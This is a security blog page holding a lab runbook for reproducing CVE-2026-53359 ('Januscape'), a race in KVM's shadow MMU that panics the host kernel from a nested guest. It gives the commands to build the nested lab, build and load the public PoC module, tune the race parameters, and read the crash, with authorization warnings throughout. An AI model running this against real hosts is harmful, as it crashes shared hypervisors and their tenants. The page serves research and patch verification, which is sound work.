@@ -1,0 +1,543 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Reproducing Januscape in a Lab (CVE-2026-53359) · Feizal Said</title><meta name="description" content="A lab runbook for standing up a nested KVM environment, building the public PoC, triggering the host panic, and verifying the fix."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="Reproducing Januscape in a Lab (CVE-2026-53359) · Feizal Said"><meta property="og:description" content="A lab runbook for standing up a nested KVM environment, building the public PoC, triggering the host panic, and verifying the fix."><meta property="og:url" content="https://feizalsaid.github.io/writeups/januscape-lab-repro-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Reproducing Januscape in a Lab (CVE-2026-53359) · Feizal Said"><meta name="twitter:description" content="A lab runbook for standing up a nested KVM environment, building the public PoC, triggering the host panic, and verifying the fix."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/januscape-lab-repro-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/1941706"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BBSei92j.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2026-10-01T00:00:00.000Z">October 1, 2026</time></span> <span class="meta font-mono">12 min read</span> </div> <h1 class="article-title font-display">Reproducing Januscape in a Lab (CVE-2026-53359)</h1> <p class="article-desc">A lab runbook for standing up a nested KVM environment, building the public PoC, triggering the host panic, and verifying the fix.</p> <ul class="tag-row"> <li class="tag">KVM</li><li class="tag">Virtualization Escape</li><li class="tag">Lab Setup</li><li class="tag">CVE-2026-53359</li><li class="tag">Linux Kernel</li><li class="tag">Nested Virtualization</li><li class="tag">Vulnerability Research</li><li class="tag">Homelab</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1611</li> </ul> </header> <div class="writeup-body"><div align="center">
+<p><strong>Authorized-testing runbook.</strong> The PoC panics the host kernel.</p>
+<p>Only on hardware you own or have explicit written permission to test. A lab L0
+you can afford to lose is a hard requirement, not a nicety.</p>
+<p>Companion to the <a href="/writeups/januscape-kvm-escape-01/">root-cause analysis</a>.</p>
+</div>
+<hr>
+<h2 id="before-anything-can-this-machine-run-it">Before anything: can this machine run it?</h2>
+<p>I checked my own box first, which turned out to be four separate blockers at once:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ uname -r</span></span>
+<span class="line"><span>7.2.3-arch1-3</span></span>
+<span class="line"><span>$ nproc</span></span>
+<span class="line"><span>2</span></span>
+<span class="line"><span>$ ls -l /dev/kvm</span></span>
+<span class="line"><span>no /dev/kvm</span></span>
+<span class="line"><span>$ grep -oE 'vmx|svm' /proc/cpuinfo | sort -u</span></span>
+<span class="line"><span>(nothing)</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Blocker</th><th>Detail</th><th>Consequence</th></tr></thead><tbody><tr><td><strong>Kernel already patched</strong></td><td>7.2.3 > 7.2-rc1, first release carrying <code>81ccda30b4e8</code></td><td>Nothing to reproduce</td></tr><tr><td><strong>No KVM, no <code>/dev/kvm</code></strong></td><td>No <code>kvm</code> modules, no device node</td><td>Can’t run a nested L1 at all</td></tr><tr><td><strong>No VMX/SVM in CPUID</strong></td><td>Virtualization extensions not exposed</td><td>PoC’s <code>virt_supported()</code> aborts with <code>-ENODEV</code></td></tr><tr><td><strong>2 cores</strong></td><td>PoC defaults to <code>nvcpu=8</code>; the race needs faulters contending on <code>mmu_lock</code></td><td>Window far too narrow</td></tr></tbody></table>
+<p>So reproduction needs a <strong>separate, disposable, unpatched</strong> x86_64 host. Check
+your own environment against that list before planning a lab — the answer is
+frequently “not this machine.”</p>
+<blockquote>
+<p><strong>On cloud instances.</strong> The panic lands on the <em>hypervisor</em>, not your VM. An
+instance with nested virt exposed is a live multi-tenant host. Getting a panic
+on a provider’s box isn’t authorized testing, no matter how isolated your VM
+feels. Reproduce on your own metal, or under a program with explicit scope for
+host-level testing.</p>
+</blockquote>
+<h3 id="where-to-run-it">Where to run it</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Option</th><th>Suitability</th></tr></thead><tbody><tr><td>Bare-metal x86_64 you own, kernel 6.1–7.1 unpatched</td><td><strong>Best</strong></td></tr><tr><td>Nested lab (L0’ → L1’ → L1 → L2)</td><td>Workable; needs <code>nested=1</code> at two levels, unpatched at both</td></tr><tr><td>Cloud with nested virt</td><td>Only if the <em>host</em> kernel is unpatched — and only with permission</td></tr><tr><td>PVE 8/9 with a pre-fix kernel snapshot</td><td>Good; snapshot the VM so you can roll back</td></tr><tr><td>Any ARM64 host</td><td><strong>Impossible</strong> — different MMU, that’s ITScape (CVE-2026-46316)</td></tr></tbody></table>
+<hr>
+<h2 id="topology">Topology</h2>
+<p>Three levels, and all three matter:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>L0  bare-metal x86_64 Linux, kvm_intel/kvm_amd with nested=1   &#x3C;-- PANICS HERE</span></span>
+<span class="line"><span>     |</span></span>
+<span class="line"><span>     +-- L1  your attacker guest (poc.ko is loaded HERE)</span></span>
+<span class="line"><span>           needs >= 8 vCPUs, >= 2 GB RAM</span></span>
+<span class="line"><span>           |</span></span>
+<span class="line"><span>           +-- L2  nested guest created by poc.ko with raw VMX/SVM</span></span></code></pre>
+<p>L0 must shadow L1’s nested EPT/NPT through the <strong>shadow MMU</strong> — the only path to
+<code>kvm_mmu_get_child_sp()</code>. A default <code>ept=1</code> / <code>tdp_mmu=Y</code> host still reaches it,
+but only once L1 actually runs L2 with nested paging.</p>
+<h3 id="preconditions">Preconditions</h3>
+<ul class="contains-task-list">
+<li class="task-list-item"><input type="checkbox" disabled> L0 is x86_64 and <strong>unpatched</strong> (2.6.36–7.1, or any tree without <code>81ccda30b4e8</code>)</li>
+<li class="task-list-item"><input type="checkbox" disabled> L0 has nested virt enabled, and it stays enabled</li>
+<li class="task-list-item"><input type="checkbox" disabled> L0 console access — physical, IPMI, or serial. <strong>The panic kills SSH.</strong></li>
+<li class="task-list-item"><input type="checkbox" disabled> L1 has <strong>≥ 8 vCPUs</strong> (<code>nvcpu</code> default) and ≥ 2 GB RAM</li>
+<li class="task-list-item"><input type="checkbox" disabled> L1 kernel headers match <code>uname -r</code> exactly</li>
+<li class="task-list-item"><input type="checkbox" disabled> L1 can <code>rmmod</code> its own <code>kvm_intel</code> / <code>kvm_amd</code></li>
+<li class="task-list-item"><input type="checkbox" disabled> You can rebuild or reinstall L0 afterward</li>
+</ul>
+<hr>
+<h2 id="step-0--confirm-l0-is-vulnerable-and-nested-is-on">Step 0 — confirm L0 is vulnerable and nested is on</h2>
+<p>On <strong>L0</strong>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># Is the fix present? (want: NO output)</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> grep</span><span style="color:#79B8FF"> -rn</span><span style="color:#9ECBFF"> "role.word == role.word"</span><span style="color:#9ECBFF"> /lib/modules/</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">uname</span><span style="color:#79B8FF"> -r</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">/build/arch/x86/kvm/mmu/mmu.c</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Version vs. the fixed window (>= 7.2 carries the fix)</span></span>
+<span class="line"><span style="color:#B392F0">uname</span><span style="color:#79B8FF"> -r</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Nested virt must be on</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /sys/module/kvm_intel/parameters/nested</span><span style="color:#6A737D">    # Intel: expect Y</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /sys/module/kvm_amd/parameters/nested</span><span style="color:#6A737D">      # AMD:   expect Y</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># x86 only</span></span>
+<span class="line"><span style="color:#B392F0">uname</span><span style="color:#79B8FF"> -m</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Who can open the device (the local LPE vector, independent of the escape)</span></span>
+<span class="line"><span style="color:#B392F0">ls</span><span style="color:#79B8FF"> -l</span><span style="color:#9ECBFF"> /dev/kvm</span></span></code></pre>
+<p>If nested reads <code>N</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> 'options kvm_intel nested=1'</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sudo</span><span style="color:#9ECBFF"> tee</span><span style="color:#9ECBFF"> /etc/modprobe.d/99-nested.conf</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> modprobe</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> kvm_intel</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> modprobe</span><span style="color:#9ECBFF"> kvm_intel</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /sys/module/kvm_intel/parameters/nested</span></span></code></pre>
+<p>If your distro pinned a kernel that already carries the fix, drop to a pre-7.2
+kernel or find different hardware. There’s no in-place way to reintroduce the bug.</p>
+<p><strong>Optional baseline:</strong> before risking anything, confirm nested virt works at all
+by running a <em>normal</em> nested guest in L1. If that’s broken, you’ll be debugging
+your lab instead of the bug.</p>
+<hr>
+<h2 id="step-1--build-l1">Step 1 — build L1</h2>
+<h3 id="create-the-disk">Create the disk</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">qemu-img</span><span style="color:#9ECBFF"> create</span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> qcow2</span><span style="color:#9ECBFF"> l1.qcow2</span><span style="color:#9ECBFF"> 16G</span></span></code></pre>
+<p>Install a minimal Linux — Debian/Ubuntu/Alma netinst is fine. You need a compiler
+and headers, not much else.</p>
+<h3 id="launch-with-nested-virt-and--8-vcpus">Launch with nested virt and ≥ 8 vCPUs</h3>
+<p>Intel host:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">qemu-system-x86_64</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -enable-kvm</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -cpu</span><span style="color:#9ECBFF"> host,vmx=on</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -m</span><span style="color:#79B8FF"> 4096</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -smp</span><span style="color:#79B8FF"> 8</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -drive</span><span style="color:#9ECBFF"> file=l1.qcow2,if=virtio,format=qcow2</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -netdev</span><span style="color:#9ECBFF"> user,id=n0</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -device</span><span style="color:#9ECBFF"> virtio-net-pci,netdev=n0</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -nographic</span></span></code></pre>
+<p>AMD host — swap the CPU feature:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">  -cpu</span><span style="color:#9ECBFF"> host,svm=on</span><span style="color:#79B8FF"> \</span></span></code></pre>
+<p>libvirt equivalent inside <code>&#x3C;domain></code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="xml"><code><span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">cpu</span><span style="color:#B392F0"> mode</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">'host-passthrough'</span><span style="color:#B392F0"> check</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">'none'</span><span style="color:#E1E4E8">/></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">features</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">  &#x3C;</span><span style="color:#85E89D">kvm</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">hidden</span><span style="color:#B392F0"> state</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">'on'</span><span style="color:#E1E4E8">/></span></span>
+<span class="line"><span style="color:#E1E4E8">  &#x3C;/</span><span style="color:#85E89D">kvm</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">features</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>with <code>&#x3C;vcpu placement='static'>8&#x3C;/vcpu></code> and ≥ 4 GB RAM.</p>
+<blockquote>
+<p><code>host-passthrough</code> / <code>-cpu host</code> is the load-bearing part. It hands L1 the CPU’s
+real VMX/SVM feature bits, which is what L1’s module needs to execute
+<code>vmxon</code>/<code>vmlaunch</code> for its own L2. A generic <code>-cpu qemu64</code> model makes
+<code>virt_supported()</code> abort.</p>
+</blockquote>
+<h3 id="verify-l1-can-see-vmxsvm">Verify L1 can see VMX/SVM</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># In L1</span></span>
+<span class="line"><span style="color:#B392F0">grep</span><span style="color:#79B8FF"> -m1</span><span style="color:#9ECBFF"> flags</span><span style="color:#9ECBFF"> /proc/cpuinfo</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> tr</span><span style="color:#9ECBFF"> ' '</span><span style="color:#9ECBFF"> '\n'</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -xE</span><span style="color:#9ECBFF"> 'vmx|svm'</span></span>
+<span class="line"><span style="color:#B392F0">nproc</span><span style="color:#6A737D">        # want >= 8</span></span>
+<span class="line"><span style="color:#B392F0">free</span><span style="color:#79B8FF"> -g</span><span style="color:#6A737D">      # want >= 2 available</span></span></code></pre>
+<p>Non-empty output means the nested path is exposed. Empty means fix the launch
+flags before going further.</p>
+<hr>
+<h2 id="step-2--build-the-poc">Step 2 — build the PoC</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># In L1, as root</span></span>
+<span class="line"><span style="color:#B392F0">apt-get</span><span style="color:#9ECBFF"> update</span></span>
+<span class="line"><span style="color:#B392F0">apt-get</span><span style="color:#9ECBFF"> install</span><span style="color:#79B8FF"> -y</span><span style="color:#9ECBFF"> build-essential</span><span style="color:#9ECBFF"> git</span><span style="color:#9ECBFF"> linux-headers-</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">uname</span><span style="color:#79B8FF"> -r</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> /root</span></span>
+<span class="line"><span style="color:#B392F0">git</span><span style="color:#9ECBFF"> clone</span><span style="color:#9ECBFF"> https://github.com/V4bel/Januscape.git</span></span>
+<span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> Januscape</span></span>
+<span class="line"><span style="color:#B392F0">make</span></span></code></pre>
+<p>Repo layout:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Januscape/</span></span>
+<span class="line"><span>├── Makefile          # obj-m += poc.o ; KDIR ?= /lib/modules/$(uname -r)/build</span></span>
+<span class="line"><span>├── poc.c             # the whole PoC</span></span>
+<span class="line"><span>├── README.md         # abstract, usage, FAQ</span></span>
+<span class="line"><span>└── assets/</span></span>
+<span class="line"><span>    ├── write-up.md   # the root-cause analysis</span></span>
+<span class="line"><span>    ├── demo.gif</span></span>
+<span class="line"><span>    └── tux.png</span></span></code></pre>
+<p>Build issues:</p>
+<ul>
+<li><code>fatal error: linux/module.h</code> → headers missing or mismatched. Confirm
+<code>linux-headers-$(uname -r)</code> matches <code>uname -r</code> exactly.</li>
+<li><code>SVM_NESTED_CTL_NP_ENABLE</code> errors on a 7.1+ kernel → the PoC already shims this
+(<code>vmcb.nested_ctl</code> → <code>vmcb.misc_ctl</code> in <code>1aea80dd42cf</code>). Hitting it means an
+unexpected tree.</li>
+</ul>
+<h3 id="expected-log-on-a-healthy-load">Expected log on a healthy load</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>poc: backend=VMX/EPT (amd=0) nvcpu=8 online=8 run_ms=600000  [rmmod kvm_intel first!]</span></span>
+<span class="line"><span>[*] poc step 1/4: backend=VMX/EPT ready (rmmod kvm_intel done)</span></span>
+<span class="line"><span>poc: DIAG VMX BASIC=... EPT_VPID=...</span></span>
+<span class="line"><span>poc: world built root=... greg=... q=... (S.gfn=... prime_gfn=... q_gfn=...)</span></span>
+<span class="line"><span>[*] poc step 2/4: nested page tables + L3 guest image built</span></span>
+<span class="line"><span>[*] poc step 3/4: launching 8 kthreads (1 writer + 7 faulters)</span></span>
+<span class="line"><span>poc[VMX/EPT]: 8 kthreads launched (1 writer + 0 flood + 7 faulters); race live</span></span>
+<span class="line"><span>[*] poc step 4/4: race live -- host DoS triggering</span></span>
+<span class="line"><span>poc[VMX/EPT]: writer live cpu0 dwell=256 run_ms=600000</span></span></code></pre>
+<p>Failure signatures are diagnostic:</p>
+<ul>
+<li><code>poc: CPU lacks VMX -> abort</code> → L1 wasn’t given VMX. Back to Step 1.</li>
+<li><code>poc: run_guest RETURNED early cpuN vmerr=... exit=...</code> → VMX launch failed.
+Usually a CR4.VMX or feature-control problem in the L1 launch flags.</li>
+</ul>
+<p>Keep the <code>world built root=... S.gfn=... prime_gfn=... q_gfn=...</code> line. It’s your
+proof the intended geometry was actually built — without it a null result means
+nothing.</p>
+<hr>
+<h2 id="step-3--run-it">Step 3 — run it</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># In L1, as root</span></span>
+<span class="line"><span style="color:#B392F0">rmmod</span><span style="color:#9ECBFF"> kvm_intel</span></span>
+<span class="line"><span style="color:#B392F0">insmod</span><span style="color:#9ECBFF"> poc.ko</span><span style="color:#6A737D">                 # Intel</span></span>
+<span class="line"><span style="color:#6A737D"># insmod poc.ko amd=1         # AMD</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># watch from a second L1 terminal</span></span>
+<span class="line"><span style="color:#B392F0">dmesg</span><span style="color:#79B8FF"> -w</span></span></code></pre>
+<p><strong>The <code>rmmod</code> is mandatory.</strong> The PoC takes raw VMX/SVM state directly. If
+<code>kvm_intel</code> / <code>kvm_amd</code> still owns the CPU, <code>vmxon</code> fails or the launch collides.
+If <code>rmmod</code> refuses with “Module kvm_intel is in use”, stop any KVM-accelerated
+guest running inside L1 first.</p>
+<h3 id="watching-the-race">Watching the race</h3>
+<p>Genuinely racy — expect <strong>seconds to minutes</strong>. Healthy traffic in L1’s <code>dmesg</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>poc: writes=2000000 race=... svm_exits=...</span></span>
+<span class="line"><span>poc: writes=4000000 race=... svm_exits=...</span></span></code></pre>
+<p><code>race_loops</code> climbing means the faulters are cycling. The writer self-stops after
+<code>run_ms</code> (default 600000 = 10 min):</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>poc[VMX/EPT]: writer deadline (writes=... race=... svm_exits=...) -> stop</span></span>
+<span class="line"><span>poc: unloaded</span></span></code></pre>
+<p><strong>If that deadline hits with no panic, L0 is probably patched.</strong> That’s a valid but
+<em>partial</em> result — absence of a crash is weak evidence, since the race may simply
+have lost. Re-run, then confirm by source inspection.</p>
+<h3 id="the-crash-on-l0s-console">The crash, on L0’s console</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gfn mismatch under direct page 8a00 (expected 8b00, got 256e4)</span></span>
+<span class="line"><span>WARNING: CPU: 6 PID: 974281 at arch/x86/kvm/mmu/mmu.c:689 kvm_mmu_page_set_translation.part.0+0xb7/0x130 [kvm]</span></span>
+<span class="line"><span>CPU: 6 PID: 974281 Comm: qemu-kvm  6.12.0-211.26.1.el10_2.x86_64</span></span>
+<span class="line"><span>kernel BUG at arch/x86/kvm/mmu/mmu.c:1091!</span></span>
+<span class="line"><span>RIP: 0010:pte_list_remove.isra.0+0xd9/0xe0 [kvm]</span></span>
+<span class="line"><span>CPU: 3 PID: 974278 Comm: qemu-kvm</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Line</th><th>Meaning</th></tr></thead><tbody><tr><td><code>gfn mismatch under direct page</code></td><td>The symptom WARN — a direct split page received a leaf whose GFN ≠ <code>sp->gfn + index</code></td></tr><tr><td><code>WARNING ... kvm_mmu_page_set_translation</code></td><td>Role confusion already happened; rmap registered under the real GFN</td></tr><tr><td><code>kernel BUG at mmu.c:1091</code></td><td>The fatal one — <code>pte_list_remove</code> found no rmap entry under the computed key</td></tr><tr><td><code>Comm: qemu-kvm</code></td><td>The host-side KVM thread that was walking the L2 tables</td></tr></tbody></table>
+<p>L1’s console dies at the same moment (that vCPU thread is <code>qemu-kvm</code> on L0). L0
+may survive in some configs — treat it as compromised and rebuild regardless.</p>
+<hr>
+<h2 id="step-4--parameters-and-tuning">Step 4 — parameters and tuning</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ insmod poc.ko help</span></span>
+<span class="line"><span>amd:       int  0444  0        1 = AMD SVM/NPT, 0 = Intel VMX/EPT (default 0)</span></span>
+<span class="line"><span>nvcpu:     int  0444  8        kthreads launched: 1 writer + (nvcpu-1) faulters</span></span>
+<span class="line"><span>dwell:     int  0444  256      cpu_relax() spins per toggle state — the race window</span></span>
+<span class="line"><span>run_ms:    int  0444  600000   writer deadline before self-stop (ms)</span></span>
+<span class="line"><span>diag:      int  0444  1        1 = basic prints, 2 = verbose per-exit diagnostics</span></span>
+<span class="line"><span>nflood:    int  0444  0        extra Intel-only EPT-root flood threads</span></span></code></pre>
+<h3 id="not-winning-the-race">Not winning the race</h3>
+<p>The window is the non-atomic gap between L0 committing the guest’s PDE write and
+zapping the old shadow link in <code>kvm_page_track_write</code>. More faulters contending on
+<code>mmu_lock</code> widens it:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># more faulters</span></span>
+<span class="line"><span style="color:#B392F0">insmod</span><span style="color:#9ECBFF"> poc.ko</span><span style="color:#9ECBFF"> nvcpu=</span><span style="color:#79B8FF">16</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># wider window per toggle state</span></span>
+<span class="line"><span style="color:#B392F0">insmod</span><span style="color:#9ECBFF"> poc.ko</span><span style="color:#9ECBFF"> nvcpu=</span><span style="color:#79B8FF">16</span><span style="color:#9ECBFF"> dwell=</span><span style="color:#79B8FF">1024</span></span>
+<span class="line"></span>
